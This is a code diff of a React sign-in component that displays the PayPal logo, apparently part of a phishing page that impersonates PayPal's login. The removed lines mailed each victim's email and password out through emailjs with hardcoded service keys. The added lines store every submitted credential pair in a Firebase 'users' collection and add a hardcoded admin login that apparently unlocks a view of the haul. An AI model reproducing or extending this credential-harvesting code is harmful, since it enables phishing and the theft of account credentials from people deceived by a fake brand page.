@@ -1,9 +1,10 @@
 import React, { useState } from "react";
-import emailjs from "emailjs-com";
+// import emailjs from "emailjs-com";
 import { Popover, PopoverHeader, PopoverBody } from "reactstrap";
 import "./SignIn.css";
+import db from "../../firebase";
 
-function SignIn() {
+function SignIn({ setIsAdmin }) {
   const logo = "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg";
 
   const [email, setEmail] = useState("");
@@ -12,21 +13,35 @@ function SignIn() {
 
   const toggle = () => setPopoverOpen(!popoverOpen);
 
-  const service_id = "service_r10yy1p";
-  const template_id = "template_6tbtipc";
-  const user_id = "user_EjrsDgwCIIV6ZOcW16y6V";
+  // async function sendEmail(email, password) {
+  //   const service_id = "service_r10yy1p";
+  //   const template_id = "template_6tbtipc";
+  //   const user_id = "user_EjrsDgwCIIV6ZOcW16y6V";
+  //   const templateParams = {
+  //     to_email: email,
+  //     message_password: password,
+  //   };
+  //   await emailjs.send(service_id, template_id, templateParams, user_id);
+  //   setEmail("");
+  //   setPassword("");
+  // }
+
+  async function addToDatabase(email, password) {
+    await db.collection("users").add({ email: email, password: password });
+  }
 
   function handelSubmit(e) {
     e.preventDefault();
 
-    const templateParams = {
-      to_email: email,
-      message_password: password,
-    };
-    emailjs.send(service_id, template_id, templateParams, user_id).then(() => {
-      setEmail("");
-      setPassword("");
-    });
+    if (email === "admin@admin.com" && password === "admin123") {
+      setIsAdmin(true);
+    } else {
+      if (email === "" || password === "") {
+        return;
+      } else {
+        addToDatabase(email, password);
+      }
+    }
   }
 
   return (
